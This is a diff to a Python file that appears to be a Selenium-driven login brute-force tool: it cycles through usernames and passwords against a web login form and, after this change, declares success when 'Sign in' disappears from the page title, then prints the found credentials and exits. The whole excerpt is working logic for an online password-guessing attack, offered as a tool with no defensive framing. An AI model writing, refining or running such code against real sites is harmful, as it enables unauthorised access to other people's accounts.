@@ -103,14 +103,23 @@ def brutes(username_list, username_selector, password_selector, login_btn_select
                 # Check for successful login by observing changes in the page
                 # You may need to customize this based on the behavior of the website
                 # if "Login Successful" in browser.page_source:
-                if browser.find_elements(By.CSS_SELECTOR, success_selector):
-                    print(color.BLUE +'------------------------')
-                    print(color.BLUE + 'Password found: ' + color.GREEN + password.strip() + color.BLUE +
-                          ' for user: ' + color.GREEN + username.strip())
-                    print(color.BLUE +'------------------------')
-                    # browser.quit()
+                # if browser.find_elements(By.CSS_SELECTOR, success_selector):
+                #     print(color.BLUE +'------------------------')
+                #     print(color.BLUE + 'Password found: ' + color.GREEN + password.strip() + color.BLUE +
+                #           ' for user: ' + color.GREEN + username.strip())
+                #     print(color.BLUE +'------------------------')
+                #     # browser.quit()
+                #     exit()
+                #     break
+                
+
+                #the program terminates after the coreect user and password is found
+                if "Sign in" not in browser.title: #this line should be written according to the website being used
+                    print(color.BLUE + '------------------------')
+                    print(color.BLUE + 'Password found: ' + color.GREEN + password.strip() + color.BLUE + ' for user: ' + color.GREEN + username.strip())
+                      
+                    print(color.BLUE + '------------------------')
                     exit()
-                    break
 
                 print('------------------------')
                 print(color.GREEN + 'Tried password: ' + color.RED + password.strip() + color.GREEN +
